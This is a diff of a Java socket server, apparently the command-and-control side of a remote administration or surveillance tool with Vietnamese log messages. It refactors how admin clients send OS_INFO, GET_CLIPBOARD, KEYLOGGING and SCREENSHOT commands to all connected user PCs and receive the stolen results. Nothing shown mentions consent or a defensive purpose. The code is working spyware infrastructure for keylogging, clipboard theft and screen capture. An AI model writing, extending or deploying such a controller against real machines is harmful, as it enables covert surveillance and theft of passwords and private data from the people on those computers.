@@ -1,25 +1,14 @@
 package Controller;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.PrintWriter;
+import javax.imageio.ImageIO;
+import java.awt.image.BufferedImage;
+import java.io.*;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.util.ArrayList;
-import java.util.HashSet;
-import java.util.List;
-import java.util.Set;
-import java.awt.*;
-import java.awt.image.BufferedImage;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.util.Base64;
-import javax.imageio.ImageIO;
-import java.io.File;
+import java.util.*;
 
 public class Server {
-    private static List<ClientHandler> userClients = new ArrayList<>();
+    private static List<UserHandler> userClients = new ArrayList<>();
     private static List<AdminHandler> adminClients = new ArrayList<>();
     private static StringBuilder systemInfo = new StringBuilder();
     private static int clientCounter = 0; // Counter for assigning unique names
@@ -59,7 +48,7 @@ public class Server {
                 if ("USER".equals(clientType)) {
                     synchronized (userConnectedIPs) {
                         if (userConnectedIPs.contains(clientIP)) {
-                            System.out.println("User IP " + clientIP + " Kết nối đã tồn tại. Kết nối HỦY BỎ.");
+                            System.out.println("User IP " + clientIP + " kết nối đã tồn tại. Kết nối HỦY BỎ.");
                             clientSocket.close();
                             return;
                         } else {
@@ -68,7 +57,7 @@ public class Server {
                     }
                     clientCounter++;
                     String clientName = "PC" + clientCounter;
-                    ClientHandler userHandler = new ClientHandler(clientSocket, clientName);
+                    UserHandler userHandler = new UserHandler(clientSocket, clientName);
                     userClients.add(userHandler);
                     System.out.println(clientName + " kết nối : " + clientSocket.getRemoteSocketAddress());
                     new Thread(userHandler).start();
@@ -101,12 +90,12 @@ public class Server {
         }
     }
 
-    private static class ClientHandler implements Runnable {
+    private static class UserHandler implements Runnable {
         private final Socket clientSocket;
         private final String clientName;
         private PrintWriter out;
 
-        public ClientHandler(Socket socket, String clientName) {
+        public UserHandler(Socket socket, String clientName) {
             this.clientSocket = socket;
             this.clientName = clientName;
         }
@@ -120,9 +109,9 @@ public class Server {
 
                 String inputLine;
                 while ((inputLine = in.readLine()) != null) {
-                    if (inputLine.startsWith("INFORMATION:")) {
-                        String info = clientName + ": " + inputLine.substring(5);
-                        sendSystemInfoToAdmins(info);
+                    if (inputLine.startsWith("OS_INFO:")) {
+                        String osInfo = inputLine.substring(8);
+                        sendSystemInfoToAdmins(osInfo);
                     } else if (inputLine.startsWith("CLIPBOARD:")) {
                         String info = clientName + ": " + inputLine.substring(10);
                         sendSystemInfoToAdmins(info);
@@ -189,54 +178,7 @@ public class Server {
 
                 String clientMessage;
                 while ((clientMessage = in.readLine()) != null) {
-                    if ("INFORMATION".equalsIgnoreCase(clientMessage)) {
-                        systemInfo.setLength(0);
-                        for (ClientHandler user : userClients) {
-                            user.sendCommand("INFORMATION");
-                        }
-                        try {
-                            Thread.sleep(3000);
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        }
-                        sendSystemInfoToAdmin();
-                    } else if ("clipboard".equalsIgnoreCase(clientMessage)) {
-                        systemInfo.setLength(0);
-                        for (ClientHandler user : userClients) {
-                            user.sendCommand("clipboard");
-                        }
-                        try {
-                            Thread.sleep(2000);
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        }
-                        sendSystemInfoToAdmin();
-                    } else if ("keylogger".equalsIgnoreCase(clientMessage)) {
-                        systemInfo.setLength(0);
-                        for (ClientHandler user : userClients) {
-                            user.sendCommand("keylogger");
-                        }
-                        try {
-                            Thread.sleep(2000);
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        }
-                        sendSystemInfoToAdmin();
-                    } else if (clientMessage.startsWith("USER")) {
-                        // Handle user connection
-                        System.out.println("User connected.");
-                    } else if (clientMessage.startsWith("SCREENSHOT:")) {
-                        String base64Image = clientMessage.substring("SCREENSHOT:".length());
-                        BufferedImage image = decodeFromBase64(base64Image);
-                        if (image != null) {
-                            // Process the received screenshot
-                            System.out.println("Received screenshot.");
-                            // Optionally save the image to a file
-                            ImageIO.write(image, "png", new File("screenshot.png"));
-                        } else {
-                            System.out.println("Failed to decode the image.");
-                        }
-                    }
+                    handleAdminRequest(clientMessage);
                 }
             } catch (IOException e) {
                 System.err.println("Error: " + e.getMessage());
@@ -253,14 +195,6 @@ public class Server {
             }
         }
 
-        private void sendSystemInfoToAdmin() {
-            if (out != null) {
-                synchronized (systemInfo) {
-                    out.println(systemInfo.toString());
-                }
-            }
-        }
-
         public void sendSystemInfo(String info) {
             if (out != null) {
                 out.println(info);
@@ -273,14 +207,23 @@ public class Server {
             }
         }
 
-        private BufferedImage decodeFromBase64(String base64Image) {
-            try {
-                byte[] imageBytes = Base64.getDecoder().decode(base64Image);
-                ByteArrayInputStream bis = new ByteArrayInputStream(imageBytes);
-                return ImageIO.read(bis);
-            } catch (IOException e) {
-                e.printStackTrace();
-                return null;
+        public void handleAdminRequest(String clientMessage) {
+            if (clientMessage.startsWith("OS_INFO")) {
+                for (UserHandler user : userClients) {
+                    user.sendCommand("OS_INFO");
+                }
+            } else if (clientMessage.startsWith("GET_CLIPBOARD")) {
+                for (UserHandler user : userClients) {
+                    user.sendCommand("GET_CLIPBOARD");
+                }
+            } else if (clientMessage.startsWith("KEYLOGGING")) {
+                for (UserHandler user : userClients) {
+                    user.sendCommand("KEYLOGGING");
+                }
+            } else if (clientMessage.startsWith("SCREENSHOT")) {
+                for (UserHandler user : userClients) {
+                    user.sendCommand("SCREENSHOT");
+                }
             }
         }
     }
